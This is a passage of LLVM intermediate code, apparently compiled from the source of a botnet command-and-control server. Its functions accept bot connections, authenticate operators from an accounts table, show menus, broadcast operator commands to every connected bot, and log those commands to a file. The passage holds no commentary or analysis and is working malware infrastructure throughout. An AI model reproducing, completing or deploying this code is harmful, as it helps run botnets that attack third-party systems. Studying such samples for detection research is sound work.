  br label %473, !llvm.loop !19

606:                                              ; preds = %532
  %607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %608 = call i8* @strstr(i8* %607, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i64 0, i64 0)) #8
  %609 = icmp ne i8* %608, null
  br i1 %609, label %610, label %680

610:                                              ; preds = %606
  %611 = load i8*, i8** %3, align 8
  %612 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %611) #9
  %613 = getelementptr inbounds [800 x i8], [800 x i8]* %50, i64 0, i64 0
  %614 = call i32 (i8*, i8*, ...) @sprintf(i8* %613, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.49, i64 0, i64 0)) #9
  %615 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %616 = call i32 (i8*, i8*, ...) @sprintf(i8* %615, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.50, i64 0, i64 0)) #9
  %617 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %618 = call i32 (i8*, i8*, ...) @sprintf(i8* %617, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.51, i64 0, i64 0)) #9
  %619 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %620 = call i32 (i8*, i8*, ...) @sprintf(i8* %619, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.52, i64 0, i64 0)) #9
  %621 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %622 = call i32 (i8*, i8*, ...) @sprintf(i8* %621, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i64 0, i64 0)) #9
  %623 = load i32, i32* %4, align 4
  %624 = getelementptr inbounds [800 x i8], [800 x i8]* %50, i64 0, i64 0
  %625 = getelementptr inbounds [800 x i8], [800 x i8]* %50, i64 0, i64 0
  %626 = call i64 @strlen(i8* %625) #8
  %627 = call i64 @send(i32 %623, i8* %624, i64 %626, i32 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

629:                                              ; preds = %610
  br label %913

630:                                              ; preds = %610
  %631 = load i32, i32* %4, align 4
  %632 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %633 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %634 = call i64 @strlen(i8* %633) #8
  %635 = call i64 @send(i32 %631, i8* %632, i64 %634, i32 16384)
  %636 = icmp eq i64 %635, -1
  br i1 %636, label %637, label %638

637:                                              ; preds = %630
  br label %913

638:                                              ; preds = %630
  %639 = load i32, i32* %4, align 4
  %640 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %641 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %642 = call i64 @strlen(i8* %641) #8
  %643 = call i64 @send(i32 %639, i8* %640, i64 %642, i32 16384)
  %644 = icmp eq i64 %643, -1
  br i1 %644, label %645, label %646

645:                                              ; preds = %638
  br label %913

646:                                              ; preds = %638
  %647 = load i32, i32* %4, align 4
  %648 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %649 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %650 = call i64 @strlen(i8* %649) #8
  %651 = call i64 @send(i32 %647, i8* %648, i64 %650, i32 16384)
  %652 = icmp eq i64 %651, -1
  br i1 %652, label %653, label %654

653:                                              ; preds = %646
  br label %913

654:                                              ; preds = %646
  %655 = load i32, i32* %4, align 4
  %656 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %657 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %658 = call i64 @strlen(i8* %657) #8
  %659 = call i64 @send(i32 %655, i8* %656, i64 %658, i32 16384)
  %660 = icmp eq i64 %659, -1
  br i1 %660, label %661, label %662

661:                                              ; preds = %654
  br label %913

662:                                              ; preds = %654
  %663 = load i8*, i8** %3, align 8
  %664 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %663) #9
  %665 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %666 = load i32, i32* %5, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %667
  %669 = getelementptr inbounds %struct.login_info, %struct.login_info* %668, i32 0, i32 0
  %670 = getelementptr inbounds [100 x i8], [100 x i8]* %669, i64 0, i64 0
  %671 = call i32 (i8*, i8*, ...) @sprintf(i8* %665, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %670) #9
  %672 = load i32, i32* %4, align 4
  %673 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %674 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %675 = call i64 @strlen(i8* %674) #8
  %676 = call i64 @send(i32 %672, i8* %673, i64 %675, i32 16384)
  %677 = icmp eq i64 %676, -1
  br i1 %677, label %678, label %679

678:                                              ; preds = %662
  br label %913

679:                                              ; preds = %662
  br label %473, !llvm.loop !19

680:                                              ; preds = %606
  %681 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %682 = call i8* @strstr(i8* %681, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i64 0, i64 0)) #8
  %683 = icmp ne i8* %682, null
  br i1 %683, label %684, label %715

684:                                              ; preds = %680
  %685 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %685, i8 0, i64 2048, i1 false)
  %686 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %687 = call i32 (i8*, i8*, ...) @sprintf(i8* %686, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.55, i64 0, i64 0)) #9
  %688 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %689 = load i32, i32* %4, align 4
  call void @broadcast(i8* %688, i32 %689, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i64 0, i64 0))
  %690 = load i32, i32* %4, align 4
  %691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %692 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %693 = call i64 @strlen(i8* %692) #8
  %694 = call i64 @send(i32 %690, i8* %691, i64 %693, i32 16384)
  %695 = icmp eq i64 %694, -1
  br i1 %695, label %696, label %697

696:                                              ; preds = %684
  br label %913

697:                                              ; preds = %684
  br label %698

698:                                              ; preds = %697
  %699 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i64 0, i64 0
  %700 = load i32, i32* %5, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %701
  %703 = getelementptr inbounds %struct.login_info, %struct.login_info* %702, i32 0, i32 0
  %704 = getelementptr inbounds [100 x i8], [100 x i8]* %703, i64 0, i64 0
  %705 = call i32 (i8*, i8*, ...) @sprintf(i8* %699, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %704) #9
  %706 = load i32, i32* %4, align 4
  %707 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i64 0, i64 0
  %708 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i64 0, i64 0
  %709 = call i64 @strlen(i8* %708) #8
  %710 = call i64 @send(i32 %706, i8* %707, i64 %709, i32 16384)
  %711 = icmp eq i64 %710, -1
  br i1 %711, label %712, label %713

712:                                              ; preds = %698
  br label %913

713:                                              ; preds = %698
  br label %714

714:                                              ; preds = %713
  br label %473, !llvm.loop !19

715:                                              ; preds = %680
  %716 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %717 = call i8* @strstr(i8* %716, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #8
  %718 = icmp ne i8* %717, null
  br i1 %718, label %719, label %836

719:                                              ; preds = %715
  %720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %720, i8 0, i64 2048, i1 false)
  %721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %722 = call i32 (i8*, i8*, ...) @sprintf(i8* %721, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.58, i64 0, i64 0)) #9
  %723 = load i32, i32* %4, align 4
  %724 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %726 = call i64 @strlen(i8* %725) #8
  %727 = call i64 @send(i32 %723, i8* %724, i64 %726, i32 16384)
  %728 = icmp eq i64 %727, -1
  br i1 %728, label %729, label %730

729:                                              ; preds = %719
  br label %913

730:                                              ; preds = %719
  %731 = load i32, i32* %4, align 4
  %732 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %733 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %734 = call i64 @strlen(i8* %733) #8
  %735 = call i64 @send(i32 %731, i8* %732, i64 %734, i32 16384)
  %736 = icmp eq i64 %735, -1
  br i1 %736, label %737, label %738

737:                                              ; preds = %730
  br label %913

738:                                              ; preds = %730
  %739 = load i32, i32* %4, align 4
  %740 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %741 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %742 = call i64 @strlen(i8* %741) #8
  %743 = call i64 @send(i32 %739, i8* %740, i64 %742, i32 16384)
  %744 = icmp eq i64 %743, -1
  br i1 %744, label %745, label %746

745:                                              ; preds = %738
  br label %913

746:                                              ; preds = %738
  %747 = load i32, i32* %4, align 4
  %748 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %749 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %750 = call i64 @strlen(i8* %749) #8
  %751 = call i64 @send(i32 %747, i8* %748, i64 %750, i32 16384)
  %752 = icmp eq i64 %751, -1
  br i1 %752, label %753, label %754

753:                                              ; preds = %746
  br label %913

754:                                              ; preds = %746
  %755 = load i32, i32* %4, align 4
  %756 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %757 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %758 = call i64 @strlen(i8* %757) #8
  %759 = call i64 @send(i32 %755, i8* %756, i64 %758, i32 16384)
  %760 = icmp eq i64 %759, -1
  br i1 %760, label %761, label %762

761:                                              ; preds = %754
  br label %913

762:                                              ; preds = %754
  %763 = load i32, i32* %4, align 4
  %764 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %765 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %766 = call i64 @strlen(i8* %765) #8
  %767 = call i64 @send(i32 %763, i8* %764, i64 %766, i32 16384)
  %768 = icmp eq i64 %767, -1
  br i1 %768, label %769, label %770

769:                                              ; preds = %762
  br label %913

770:                                              ; preds = %762
  %771 = load i32, i32* %4, align 4
  %772 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %773 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %774 = call i64 @strlen(i8* %773) #8
  %775 = call i64 @send(i32 %771, i8* %772, i64 %774, i32 16384)
  %776 = icmp eq i64 %775, -1
  br i1 %776, label %777, label %778

777:                                              ; preds = %770
  br label %913

778:                                              ; preds = %770
  %779 = load i32, i32* %4, align 4
  %780 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %781 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %782 = call i64 @strlen(i8* %781) #8
  %783 = call i64 @send(i32 %779, i8* %780, i64 %782, i32 16384)
  %784 = icmp eq i64 %783, -1
  br i1 %784, label %785, label %786

785:                                              ; preds = %778
  br label %913

786:                                              ; preds = %778
  %787 = load i32, i32* %4, align 4
  %788 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %789 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %790 = call i64 @strlen(i8* %789) #8
  %791 = call i64 @send(i32 %787, i8* %788, i64 %790, i32 16384)
  %792 = icmp eq i64 %791, -1
  br i1 %792, label %793, label %794

793:                                              ; preds = %786
  br label %913

794:                                              ; preds = %786
  %795 = load i32, i32* %4, align 4
  %796 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %797 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %798 = call i64 @strlen(i8* %797) #8
  %799 = call i64 @send(i32 %795, i8* %796, i64 %798, i32 16384)
  %800 = icmp eq i64 %799, -1
  br i1 %800, label %801, label %802

801:                                              ; preds = %794
  br label %913

802:                                              ; preds = %794
  %803 = load i32, i32* %4, align 4
  %804 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %805 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %806 = call i64 @strlen(i8* %805) #8
  %807 = call i64 @send(i32 %803, i8* %804, i64 %806, i32 16384)
  %808 = icmp eq i64 %807, -1
  br i1 %808, label %809, label %810

809:                                              ; preds = %802
  br label %913

810:                                              ; preds = %802
  %811 = load i32, i32* %4, align 4
  %812 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %813 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %814 = call i64 @strlen(i8* %813) #8
  %815 = call i64 @send(i32 %811, i8* %812, i64 %814, i32 16384)
  %816 = icmp eq i64 %815, -1
  br i1 %816, label %817, label %818

817:                                              ; preds = %810
  br label %913

818:                                              ; preds = %810
  br label %819

819:                                              ; preds = %818
  %820 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i64 0, i64 0
  %821 = load i32, i32* %5, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %822
  %824 = getelementptr inbounds %struct.login_info, %struct.login_info* %823, i32 0, i32 0
  %825 = getelementptr inbounds [100 x i8], [100 x i8]* %824, i64 0, i64 0
  %826 = call i32 (i8*, i8*, ...) @sprintf(i8* %820, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %825) #9
  %827 = load i32, i32* %4, align 4
  %828 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i64 0, i64 0
  %829 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i64 0, i64 0
  %830 = call i64 @strlen(i8* %829) #8
  %831 = call i64 @send(i32 %827, i8* %828, i64 %830, i32 16384)
  %832 = icmp eq i64 %831, -1
  br i1 %832, label %833, label %834

833:                                              ; preds = %819
  br label %913

834:                                              ; preds = %819
  br label %835

835:                                              ; preds = %834
  br label %473, !llvm.loop !19

836:                                              ; preds = %715
  %837 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %838 = call i8* @strstr(i8* %837, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0)) #8
  %839 = icmp ne i8* %838, null
  br i1 %839, label %840, label %858

840:                                              ; preds = %836
  %841 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %841, i8 0, i64 2048, i1 false)
  %842 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %843 = load i32, i32* %5, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %844
  %846 = getelementptr inbounds %struct.login_info, %struct.login_info* %845, i32 0, i32 0
  %847 = getelementptr inbounds [100 x i8], [100 x i8]* %846, i64 0, i64 0
  %848 = call i32 (i8*, i8*, ...) @sprintf(i8* %842, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.60, i64 0, i64 0), i8* %847) #9
  %849 = load i32, i32* %4, align 4
  %850 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %851 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %852 = call i64 @strlen(i8* %851) #8
  %853 = call i64 @send(i32 %849, i8* %850, i64 %852, i32 16384)
  %854 = icmp eq i64 %853, -1
  br i1 %854, label %855, label %856

855:                                              ; preds = %840
  br label %913

856:                                              ; preds = %840
  %857 = call i32 @sleep(i32 2)
  br label %913

858:                                              ; preds = %836
  %859 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %859)
  %860 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i64 0, i64 0
  %861 = load i32, i32* %5, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %862
  %864 = getelementptr inbounds %struct.login_info, %struct.login_info* %863, i32 0, i32 0
  %865 = getelementptr inbounds [100 x i8], [100 x i8]* %864, i64 0, i64 0
  %866 = call i32 (i8*, i8*, ...) @sprintf(i8* %860, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %865) #9
  %867 = load i32, i32* %4, align 4
  %868 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i64 0, i64 0
  %869 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i64 0, i64 0
  %870 = call i64 @strlen(i8* %869) #8
  %871 = call i64 @send(i32 %867, i8* %868, i64 %870, i32 16384)
  %872 = icmp eq i64 %871, -1
  br i1 %872, label %873, label %874

873:                                              ; preds = %858
  br label %913

874:                                              ; preds = %858
  %875 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %876 = call i64 @strlen(i8* %875) #8
  %877 = icmp eq i64 %876, 0
  br i1 %877, label %878, label %879

878:                                              ; preds = %874
  br label %473, !llvm.loop !19

879:                                              ; preds = %874
  %880 = load i32, i32* %5, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %881
  %883 = getelementptr inbounds %struct.login_info, %struct.login_info* %882, i32 0, i32 0
  %884 = getelementptr inbounds [100 x i8], [100 x i8]* %883, i64 0, i64 0
  %885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %886 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* %884, i8* %885)
  %887 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.62, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i64 0, i64 0))
  store %struct._IO_FILE* %887, %struct._IO_FILE** %63, align 8
  %888 = call i64 @time(i64* null) #9
  store i64 %888, i64* %64, align 8
  %889 = call %struct.tm* @gmtime(i64* %64) #9
  store %struct.tm* %889, %struct.tm** %65, align 8
  %890 = getelementptr inbounds [50 x i8], [50 x i8]* %66, i64 0, i64 0
  %891 = load %struct.tm*, %struct.tm** %65, align 8
  %892 = call i64 @strftime(i8* %890, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i64 0, i64 0), %struct.tm* %891) #9
  %893 = load %struct._IO_FILE*, %struct._IO_FILE** %63, align 8
  %894 = getelementptr inbounds [50 x i8], [50 x i8]* %66, i64 0, i64 0
  %895 = load i32, i32* %5, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %896
  %898 = getelementptr inbounds %struct.login_info, %struct.login_info* %897, i32 0, i32 0
  %899 = getelementptr inbounds [100 x i8], [100 x i8]* %898, i64 0, i64 0
  %900 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %901 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %893, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i64 0, i64 0), i8* %894, i8* %899, i8* %900)
  %902 = load %struct._IO_FILE*, %struct._IO_FILE** %63, align 8
  %903 = call i32 @fclose(%struct._IO_FILE* %902)
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %905 = load i32, i32* %4, align 4
  %906 = load i32, i32* %5, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %907
  %909 = getelementptr inbounds %struct.login_info, %struct.login_info* %908, i32 0, i32 0
  %910 = getelementptr inbounds [100 x i8], [100 x i8]* %909, i64 0, i64 0
  call void @broadcast(i8* %904, i32 %905, i8* %910)
  %911 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %911, i8 0, i64 2048, i1 false)
  br label %473, !llvm.loop !19

912:                                              ; preds = %473
  br label %913

913:                                              ; preds = %912, %873, %856, %855, %833, %817, %809, %801, %793, %785, %777, %769, %761, %753, %745, %737, %729, %712, %696, %678, %661, %653, %645, %637, %629, %604, %587, %579, %571, %563, %555, %530, %464, %448, %440, %432, %424, %416, %408, %400, %392, %384, %376, %368, %360, %324, %323, %316, %307, %299, %290, %282, %273, %265, %256, %248, %239, %231, %176, %170, %155, %127, %121
  %914 = load i32, i32* %4, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %915
  %917 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %916, i32 0, i32 0
  store i32 0, i32* %917, align 4
  %918 = load i32, i32* %4, align 4
  %919 = call i32 @close(i32 %918)
  %920 = load volatile i32, i32* @OperatorsConnected, align 4
  %921 = add nsw i32 %920, -1
  store volatile i32 %921, i32* @OperatorsConnected, align 4
  br label %922

922:                                              ; preds = %913, %515, %507, %499
  %923 = load i8*, i8** %2, align 8
  ret i8* %923
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.66, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.67, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.68, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.69, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.71, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.72, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
